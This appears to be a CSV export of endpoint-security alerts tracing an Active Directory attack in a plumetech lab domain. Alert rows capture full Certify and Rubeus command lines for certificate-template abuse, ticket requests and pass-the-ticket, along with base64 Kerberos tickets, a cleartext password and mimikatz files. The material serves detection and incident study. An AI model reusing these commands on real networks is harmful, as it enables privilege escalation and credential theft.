"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T13:23:45.406Z","10.0.6.11","High","70","A process has written a suspicious file to disk. Adversaries may write a malicious file to a commonly trusted directory, use a benign name, or a mismatched file extension. This is done for the sake of evading defenses and observation. Check the activity and surrounding events are expected in your environment.","C:\Windows\Explorer.EXE","@{filename=mimikatz.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimispool.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimilib.dll; filepath=\Device\HarddiskVolume1\test; timestamp=1743169018},@{filename=mimidrv.sys; filepath=\Device\HarddiskVolume1\test; timestamp=1743169017},@{filename=Microsoft Edge.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743166150},@{filename=Local Disk (C) (2).lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=test.lnk; filepath=\Device\HarddiskVolume1\Users\peter\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743168223},@{filename=Desktop.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129},@{filename=Rubeus.exe; filepath=\Device\HarddiskVolume1\test; timestamp=1743168225},@{filename=Downloads.lnk; filepath=\Device\HarddiskVolume1\Users\peter\Links; timestamp=1743166129}",
"2025-03-28T13:20:45.054Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgs /service:cifs/otdc1.plumetech-ot.local /domain:plumetech-ot.local /dc:otdc1.plumetech-ot.local /ticket:doIFpzCCBaOgAwIBBaEDAgEWooIEozCCBJ9hggSbMIIEl6ADAgEFoREbD1BMVU1FVEVDSC5MT0NBTKInMCWgAwIBAqEeMBwbBmtyYnRndBsSUExVTUVURUNILU9ULkxPQ0FMo4IEUjCCBE6gAwIBEqKCBEUEggRBmJdUZMWJt8eN4QCUoBPpbu1jOX2GQpkNBED6Gm3tH8mN38wJxef+joIOFmuC28CMpfjjDY332au38OZeoaMJP2Ezu9Kbr/hZpXrJQFPy6ZJSxw1Du/Tcrp49WAxjzZwwpQJW8woD7G8MFtFwmTY5RH3mWswCOW27EWC/niyzWcYnEMA+CDIwKGOvBU2hqfZ/w1YYniGSl3rQV25ri3id1tAHe5+HbuLJGtMfeO3BqXWtjhObx/zHuzy/cvqWJJkUEqEduIRUJSnE8I53xXwXMC+S7u1KixcyM0O+FFVw2dYfcjwJvfI+OewDe8X9ZiBGA3oUuHATz2tXbf7e7x/i6reqxmpIthy+KwGGT7snJag26jgSOYmrInzmK272O5pmnjYrjmeq2wPr5/YNqVnKoBOV1lZf3BumT2XCWFog3cQvJhQz3hUn9Oeo81sKRvQplPXVn1tNFf9lT74RHfGSg2CYxQLhkk1A/PRTWqOc/6a+MRMp92uqb2Qm/1CZTat4TbdsPI8JwwUK2L8FokmapI6Rb8mBXENsbGgiSvhfKDmk4y0MA2OqhAhID+sIy2G66X/T8fUf/G/wPTxCkBHzccUyf8rDS8HkezoziNRdoy/9A0EGgiSVdlaT2pm/573jwcvb3xOyeW2DiBo4HjtJcMXsRrUrmqilvP4V7wEkvZ6Ppop+QJXRQdVmfFlYA66ZH//LQHLwUvLglvA/7MLGpcvF0GzYwuIhhNOia9ESMDZlIvMl9m8PQ+k0iHv1g+UaS1VV3ExsliT8kz+anxFipk5shMZhn6rS2/NDH0Y16lc3Kiwlm2xtTjzzfk3pBNLD3f2uNPObSuTQWwMFiQf8dExcL9Y4aHowp32rVpRrSToLx74uATmQSPGB8JYv+fMPJj3SUVdFN4PivIa0Iuwuzad//XjdahgBJnRrd2A9P1lSdHptD8RNtOAB6de619EjKC/OnLsIDTxa6QHh9syAMjgo0F8xUF+1opPCppKvoV2nvEw+hpCY6RrMRivUZeg5Zga2SG3ipaORlrxYw0QsMcvsSwodGso1ootraIwcf61Jn+I5bs3dofXkqNX41AgvWGfEOosh4bqeE0806IY3gh8buJZDITilxn4BliVo5+IIStq3o8idZXiqZ+2xwwGleo1mfosQTQ2vN/wfKYOf1Owsg48WcQeZG+YJFy4mxVW2PRclGgo02/CJAcoB0H5/jbz5tJ5q9gYj9Ckb+ovY6mK82CnUd/faJ2qp9dK8VkUL/7tjRoxTH56HX4TLbMEvqI/uZR3OIqD0SnsfD38yHHDqgFGLEa3ewd2cvo0U5XNjEW84/PwOfKc801N89r6A78o9xR3ZethW/rCBTrWNXlbbgriAQpj4TXw58trfHGO9En0dBD3pfJF07MvobLdLvH4iKVJ2qDoeBBUj5ltWCmAe7HJUg9IE2APJDe5GS+Wwo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg1Bg0xria6OkknVkWMqwmXmTH/hYcpa3b6Fu7AR6qaxihERsPUExVTUVURUNILkxPQ0FMohIwEKADAgEBoQkwBxsFcGV0ZXKjBwMFAEChAAClERgPMjAyNTAzMjgxMzE2NDBaphEYDzIwMjUwMzI4MjMxMjQ4WqcRGA8yMDI1MDQwNDEzMTI0OFqoERsPUExVTUVURUNILkxPQ0FMqScwJaADAgECoR4wHBsGa3JidGd0GxJQTFVNRVRFQ0gtT1QuTE9DQUw= /nowrap ","",
"2025-03-28T13:20:44.552Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgs /service:cifs/otdc1.plumetech-ot.local /domain:plumetech-ot.local /dc:otdc1.plumetech-ot.local /ticket:doIFpzCCBaOgAwIBBaEDAgEWooIEozCCBJ9hggSbMIIEl6ADAgEFoREbD1BMVU1FVEVDSC5MT0NBTKInMCWgAwIBAqEeMBwbBmtyYnRndBsSUExVTUVURUNILU9ULkxPQ0FMo4IEUjCCBE6gAwIBEqKCBEUEggRBmJdUZMWJt8eN4QCUoBPpbu1jOX2GQpkNBED6Gm3tH8mN38wJxef+joIOFmuC28CMpfjjDY332au38OZeoaMJP2Ezu9Kbr/hZpXrJQFPy6ZJSxw1Du/Tcrp49WAxjzZwwpQJW8woD7G8MFtFwmTY5RH3mWswCOW27EWC/niyzWcYnEMA+CDIwKGOvBU2hqfZ/w1YYniGSl3rQV25ri3id1tAHe5+HbuLJGtMfeO3BqXWtjhObx/zHuzy/cvqWJJkUEqEduIRUJSnE8I53xXwXMC+S7u1KixcyM0O+FFVw2dYfcjwJvfI+OewDe8X9ZiBGA3oUuHATz2tXbf7e7x/i6reqxmpIthy+KwGGT7snJag26jgSOYmrInzmK272O5pmnjYrjmeq2wPr5/YNqVnKoBOV1lZf3BumT2XCWFog3cQvJhQz3hUn9Oeo81sKRvQplPXVn1tNFf9lT74RHfGSg2CYxQLhkk1A/PRTWqOc/6a+MRMp92uqb2Qm/1CZTat4TbdsPI8JwwUK2L8FokmapI6Rb8mBXENsbGgiSvhfKDmk4y0MA2OqhAhID+sIy2G66X/T8fUf/G/wPTxCkBHzccUyf8rDS8HkezoziNRdoy/9A0EGgiSVdlaT2pm/573jwcvb3xOyeW2DiBo4HjtJcMXsRrUrmqilvP4V7wEkvZ6Ppop+QJXRQdVmfFlYA66ZH//LQHLwUvLglvA/7MLGpcvF0GzYwuIhhNOia9ESMDZlIvMl9m8PQ+k0iHv1g+UaS1VV3ExsliT8kz+anxFipk5shMZhn6rS2/NDH0Y16lc3Kiwlm2xtTjzzfk3pBNLD3f2uNPObSuTQWwMFiQf8dExcL9Y4aHowp32rVpRrSToLx74uATmQSPGB8JYv+fMPJj3SUVdFN4PivIa0Iuwuzad//XjdahgBJnRrd2A9P1lSdHptD8RNtOAB6de619EjKC/OnLsIDTxa6QHh9syAMjgo0F8xUF+1opPCppKvoV2nvEw+hpCY6RrMRivUZeg5Zga2SG3ipaORlrxYw0QsMcvsSwodGso1ootraIwcf61Jn+I5bs3dofXkqNX41AgvWGfEOosh4bqeE0806IY3gh8buJZDITilxn4BliVo5+IIStq3o8idZXiqZ+2xwwGleo1mfosQTQ2vN/wfKYOf1Owsg48WcQeZG+YJFy4mxVW2PRclGgo02/CJAcoB0H5/jbz5tJ5q9gYj9Ckb+ovY6mK82CnUd/faJ2qp9dK8VkUL/7tjRoxTH56HX4TLbMEvqI/uZR3OIqD0SnsfD38yHHDqgFGLEa3ewd2cvo0U5XNjEW84/PwOfKc801N89r6A78o9xR3ZethW/rCBTrWNXlbbgriAQpj4TXw58trfHGO9En0dBD3pfJF07MvobLdLvH4iKVJ2qDoeBBUj5ltWCmAe7HJUg9IE2APJDe5GS+Wwo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg1Bg0xria6OkknVkWMqwmXmTH/hYcpa3b6Fu7AR6qaxihERsPUExVTUVURUNILkxPQ0FMohIwEKADAgEBoQkwBxsFcGV0ZXKjBwMFAEChAAClERgPMjAyNTAzMjgxMzE2NDBaphEYDzIwMjUwMzI4MjMxMjQ4WqcRGA8yMDI1MDQwNDEzMTI0OFqoERsPUExVTUVURUNILkxPQ0FMqScwJaADAgECoR4wHBsGa3JidGd0GxJQTFVNRVRFQ0gtT1QuTE9DQUw= /nowrap ","",
"2025-03-28T13:16:40.68Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgs /service:krbtgt/plumetech-ot.local /domain:plumetech.local /dc:dc1.plumetech.local /ticket:doIFhjCCBYKgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoREbD1BMVU1FVEVDSC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPcGx1bWV0ZWNoLmxvY2Fso4IERzCCBEOgAwIBEqEDAgECooIENQSCBDGCF2ks5QlPOc2PvHra193VWGeFpWL0owEAygBkVXe2Q+ETYGgaDEyhtcwqFQG5qYpNKbmxvkP2f34w0dyxEO3KO8ldweMg0M2tu8rQU9mLqAMSOETaocTPPWy6xbUiM54yB3DvxcmZx+wqh3JvYZfGfav65cheXW9OAIyMxs93bbwfv3QU9nWHDiTfqro+IV+C+9v5emLFlVEJ3Q+lKQbDSLbTRRqTd/C2zxpRo6BCGJjjr6trWhE3V/Ds1dg0HS7jkLRQp8UNp8i2eze42EMR+uzGx3DqTm2X2KjlDgb5s0HlZGULgr5yT/txz7+7it1u+v+Bn1T1LPMSy+NkvbA6BvSVYrK4AmzS29kNye4C1JCielig5LgvRZ7OC0MYGp6SNVH5Nyw3wM5luerBeHqqohHq3gHRoiO35DZ6XiAJZZa/BChn/XnY5J2w9ZpBYzB7x407xZNOwRFxo1BzrQf+pEf1o3l+Wd0MuwiwlenymsQefT7jcCC8sUMTLhwIpzTU44NYafi4AsDdZrBzYFD/IGeoVBg8c+MdP3/42sGgJPUVK0IonR1mXkDz1Drqwz1qRAy959A4g/8DTj6/8TGLp6LcVBKXK17+wHpuR24DKCIE3fjh3dll2G6NlzB0KP6SDHZz5vpOUpNg6TsckaToY2vXEnLFWIuSxDDRzDIFOlvu5LEnmVTHcnTXtSNCR+Jw3SSCPoRubP5joch4LfSwpPiUify6iiaisrqQDJU3ny8VxzzjFWeA/K/krDgBBclDP1K5NEZExCtjuPCkgaeXjLdJU3/kz7zAIC7j60kReufnwdGJ0NIcpnkF2OXlKSjVUj5YFK8TswsSn2ZKI/7+HV3a3Yf9ZHEvqYf7kET3upDrlwz7TosYEli733A9+XNczLzuXYi4HB6OWIjv5/HPOg2ehc2uYcvZEYeHYiShwGF6/Kfw62xG+45Y6PDAoFOKawqejADY6Ol1WmQYfwoMhSlNZ6naOgLbF8H38T6cr1AeLwMMLlcpyzVdbY5Bzi+t50Re8113wb1/zdKnqi9Qzb/Hu+kLMvFf5UtslaBjKrblimi/p/5gemEepmZ59T2JZt8xd77qGOTaI4oyYa4yTciyG8pyGiyY8d/w9ROfZRvXi18t7kgU2PRJxoffSPf9aoLvPC3vnMSEZSmZF6p2jii8yemwf0kqKZxI03Ggftw5tsgEgytxvKsr73dOkRnBe92Akc145fqmfn1MJCzbR5BogP4O509OlSUqehLkqYegzMSrZ3u9EuK2lwKZXtZN6WR6E8pOSpNEgnzvl8S+qxDEOrwZWrd7P0Zy1hn9fjoQzwwH4KFdtJn0eN+9sauVihO70SmvszNgZoo8843ZgIcFcP+FJeIqz78tt4/luwYdH2Uh6MsX6jm+gf4ABBIEt0nbcr3Hef7ywIH5CgMgk6OB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oBswGaADAgEXoRIEEApG7dRHgEe8mFJdeppevtyhERsPUExVTUVURUNILkxPQ0FMohIwEKADAgEBoQkwBxsFcGV0ZXKjBwMFAEDhAAClERgPMjAyNTAzMjgxMzEyNDhaphEYDzIwMjUwMzI4MjMxMjQ4WqcRGA8yMDI1MDQwNDEzMTI0OFqoERsPUExVTUVURUNILkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9wbHVtZXRlY2gubG9jYWw= /nowrap","",
"2025-03-28T13:16:40.183Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgs /service:krbtgt/plumetech-ot.local /domain:plumetech.local /dc:dc1.plumetech.local /ticket:doIFhjCCBYKgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoREbD1BMVU1FVEVDSC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPcGx1bWV0ZWNoLmxvY2Fso4IERzCCBEOgAwIBEqEDAgECooIENQSCBDGCF2ks5QlPOc2PvHra193VWGeFpWL0owEAygBkVXe2Q+ETYGgaDEyhtcwqFQG5qYpNKbmxvkP2f34w0dyxEO3KO8ldweMg0M2tu8rQU9mLqAMSOETaocTPPWy6xbUiM54yB3DvxcmZx+wqh3JvYZfGfav65cheXW9OAIyMxs93bbwfv3QU9nWHDiTfqro+IV+C+9v5emLFlVEJ3Q+lKQbDSLbTRRqTd/C2zxpRo6BCGJjjr6trWhE3V/Ds1dg0HS7jkLRQp8UNp8i2eze42EMR+uzGx3DqTm2X2KjlDgb5s0HlZGULgr5yT/txz7+7it1u+v+Bn1T1LPMSy+NkvbA6BvSVYrK4AmzS29kNye4C1JCielig5LgvRZ7OC0MYGp6SNVH5Nyw3wM5luerBeHqqohHq3gHRoiO35DZ6XiAJZZa/BChn/XnY5J2w9ZpBYzB7x407xZNOwRFxo1BzrQf+pEf1o3l+Wd0MuwiwlenymsQefT7jcCC8sUMTLhwIpzTU44NYafi4AsDdZrBzYFD/IGeoVBg8c+MdP3/42sGgJPUVK0IonR1mXkDz1Drqwz1qRAy959A4g/8DTj6/8TGLp6LcVBKXK17+wHpuR24DKCIE3fjh3dll2G6NlzB0KP6SDHZz5vpOUpNg6TsckaToY2vXEnLFWIuSxDDRzDIFOlvu5LEnmVTHcnTXtSNCR+Jw3SSCPoRubP5joch4LfSwpPiUify6iiaisrqQDJU3ny8VxzzjFWeA/K/krDgBBclDP1K5NEZExCtjuPCkgaeXjLdJU3/kz7zAIC7j60kReufnwdGJ0NIcpnkF2OXlKSjVUj5YFK8TswsSn2ZKI/7+HV3a3Yf9ZHEvqYf7kET3upDrlwz7TosYEli733A9+XNczLzuXYi4HB6OWIjv5/HPOg2ehc2uYcvZEYeHYiShwGF6/Kfw62xG+45Y6PDAoFOKawqejADY6Ol1WmQYfwoMhSlNZ6naOgLbF8H38T6cr1AeLwMMLlcpyzVdbY5Bzi+t50Re8113wb1/zdKnqi9Qzb/Hu+kLMvFf5UtslaBjKrblimi/p/5gemEepmZ59T2JZt8xd77qGOTaI4oyYa4yTciyG8pyGiyY8d/w9ROfZRvXi18t7kgU2PRJxoffSPf9aoLvPC3vnMSEZSmZF6p2jii8yemwf0kqKZxI03Ggftw5tsgEgytxvKsr73dOkRnBe92Akc145fqmfn1MJCzbR5BogP4O509OlSUqehLkqYegzMSrZ3u9EuK2lwKZXtZN6WR6E8pOSpNEgnzvl8S+qxDEOrwZWrd7P0Zy1hn9fjoQzwwH4KFdtJn0eN+9sauVihO70SmvszNgZoo8843ZgIcFcP+FJeIqz78tt4/luwYdH2Uh6MsX6jm+gf4ABBIEt0nbcr3Hef7ywIH5CgMgk6OB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oBswGaADAgEXoRIEEApG7dRHgEe8mFJdeppevtyhERsPUExVTUVURUNILkxPQ0FMohIwEKADAgEBoQkwBxsFcGV0ZXKjBwMFAEDhAAClERgPMjAyNTAzMjgxMzEyNDhaphEYDzIwMjUwMzI4MjMxMjQ4WqcRGA8yMDI1MDQwNDEzMTI0OFqoERsPUExVTUVURUNILkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9wbHVtZXRlY2gubG9jYWw= /nowrap","",
"2025-03-28T13:12:49.18Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgt /user:peter /domain:plumetech.local /password:qwertz /nowrap","",
"2025-03-28T13:12:48.678Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgt /user:peter /domain:plumetech.local /password:qwertz /nowrap","",
"2025-03-28T13:12:48.164Z","10.0.6.29","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","Rubeus.exe  asktgt /user:peter /domain:plumetech.local /password:qwertz /nowrap","",
"2025-03-28T12:32:54.728Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgt /user:nina /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx /ptt","",
"2025-03-28T12:32:53.703Z","10.0.6.29","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","Rubeus.exe  asktgt /user:nina /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx /ptt","",
"2025-03-28T12:32:53.703Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgt /user:nina /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx /ptt","",
"2025-03-28T12:32:10.39Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgt /user:backup /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx /ptt","",
"2025-03-28T12:32:10.369Z","10.0.6.29","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","Rubeus.exe  asktgt /user:backup /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx /ptt","",
"2025-03-28T12:32:10.369Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgt /user:backup /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx /ptt","",
"2025-03-28T12:29:10.359Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgt /user:localadmin /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx","",
"2025-03-28T12:29:09.307Z","10.0.6.29","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","Rubeus.exe  asktgt /user:localadmin /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx","",
"2025-03-28T12:29:09.307Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgt /user:localadmin /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx","",
"2025-03-28T12:27:47.958Z","10.0.6.29","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","Certify.exe  request /ca:DC1.PLUMETECH.LOCAL\PLUMETECH-DC1-CA /template:Smartcard /altname:backup","",
"2025-03-28T12:27:47.958Z","10.0.6.29","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","Certify.exe  request /ca:DC1.PLUMETECH.LOCAL\PLUMETECH-DC1-CA /template:Smartcard /altname:backup","",
"2025-03-28T12:23:47.779Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","Rubeus.exe  asktgt /user:localadmin /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx","",
"2025-03-28T12:23:46.772Z","10.0.6.29","Medium","50","A suspicious process related to a likely malicious file was launched. Review any binaries involved as they might be related to malware.","Rubeus.exe  asktgt /user:localadmin /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx","",
"2025-03-28T12:23:46.768Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","Rubeus.exe  asktgt /user:localadmin /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx","",
"2025-03-28T12:23:46.768Z","10.0.6.29","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","Rubeus.exe  asktgt /user:localadmin /certificate:C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\cert.pfx","",
"2025-03-28T12:17:01.704Z","10.0.6.29","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","Certify.exe  request /ca:DC1.PLUMETECH.LOCAL\PLUMETECH-DC1-CA /template:Smartcard /altname:localadmin","",
"2025-03-28T12:17:01.704Z","10.0.6.29","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","Certify.exe  request /ca:DC1.PLUMETECH.LOCAL\PLUMETECH-DC1-CA /template:Smartcard /altname:localadmin","",
"2025-03-28T12:14:12.478Z","10.0.6.29","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","Certify.exe  find /vulnerable","",
"2025-03-28T12:14:12.478Z","10.0.6.29","High","70","A suspicious process attempted to elevate its privileges using misconfigured Active Directory Domain. Privilege escalation can be used by adversaries to bypass access controls. Review the process tree.","Certify.exe  find /vulnerable","",
"2025-03-28T12:14:12.478Z","10.0.6.29","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","Certify.exe  find /vulnerable","",
"2025-03-28T12:12:56.464Z","10.0.6.29","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","certify.exe  request /ca:10.0.6.11 /template:smartcard /altname:backup /ca pem","",
"2025-03-28T12:12:56.464Z","10.0.6.29","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","certify.exe  request /ca:10.0.6.11 /template:smartcard /altname:backup /ca pem","",
"2025-03-28T12:10:08.901Z","10.0.6.29","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","certify.exe  request /ca:10.0.6.11 /template:smartcard /altname:backup","",
"2025-03-28T12:10:08.901Z","10.0.6.29","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","certify.exe  request /ca:10.0.6.11 /template:smartcard /altname:backup","",
"2025-03-28T11:58:16.469Z",,"Informational","5","Techniques: OS Credential Dumping, Sensor-based ML",,"","@{agent_ids=9abfb370cf4e4a8eacb572c9fbb9bbdd; domain=DC1.PLUMETECH.LOCAL; file_name=ADExplorer.exe Certify.exe Rubeus.exe WMIC.exe explorer.exe mimikatz.exe net1.exe powershell.exe; image_file_name=\Device\HarddiskVolume1\Users\martin\AppData\Local\Temp\2\ADExplorer.exe \Device\HarddiskVolume1\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\Certify.exe \Device\HarddiskVolume1\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\Rubeus.exe \Device\HarddiskVolume1\Users\martin\Pictures\mimikatz_trunk\x64\ADExplorer.exe \Device\HarddiskVolume1\Users\martin\Pictures\mimikatz_trunk\x64\mimikatz.exe \Device\HarddiskVolume1\Windows\System32\WindowsPowerShell\v1.0\powershell.exe \Device\HarddiskVolume1\Windows\System32\net1.exe \Device\HarddiskVolume1\Windows\System32\wbem\WMIC.exe \Device\HarddiskVolume1\Windows\explorer.exe; ipv4=10.0.6.11; process=1240 2472 2788 3152 3156 3452 3460 3972 4412 4612 4960 5892 5912 5988 6336 6360 980; sha256=1bfbefa4ff4d0df3ee0090b5079cf84ed2e8d5377ba5b7a30afd88367d57b9ff 24bf26349e8947f05aaf6a7fac826c98084876cc17f369fa9b95861a361d4a97 26e89cb7afcb09c11b5563c3650196a0f935a95ed44bf1a52c261049db2c4fec 38f4384643b3fa0de714d2367b712c2e0fa1c89e2cfd131ae6b831ad962b1033 61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1 af5c3a5f68323ac68b258dae37c20e48f594118d08479f92a78bd54d26debd9a b27dd8e9d97e8f88b25b71264b3881c523d2c2ea5d37e89ef672be0cdae5debb c5c5363d675d1bd6797081b8b7afd7fb209960a45fe18202d64d36b72a013866 e451287843b3927c6046eaabd3e22b929bc1f445eec23a73b1398b115d02e4fb; username=martin@PLUMETECH.LOCAL}"
"2025-03-28T11:57:30.729Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\Rubeus.exe"" asktgt /user:martin /certificate:C:\test\cert.pfx /ptt","",
"2025-03-28T11:57:29.683Z","10.0.6.29","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","""C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\Rubeus.exe"" asktgt /user:martin /certificate:C:\test\cert.pfx /ptt","",
"2025-03-28T11:57:29.683Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","""C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\Rubeus.exe"" asktgt /user:martin /certificate:C:\test\cert.pfx /ptt","",
"2025-03-28T11:57:19.245Z","10.0.6.29","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\Rubeus.exe"" asktgt /user:Martin /certificate:C:\test\cert.pfx /ptt","",
"2025-03-28T11:57:18.132Z","10.0.6.29","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","""C:\Users\martin\Downloads\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\Rubeus.exe"" asktgt /user:Martin /certificate:C:\test\cert.pfx /ptt","",
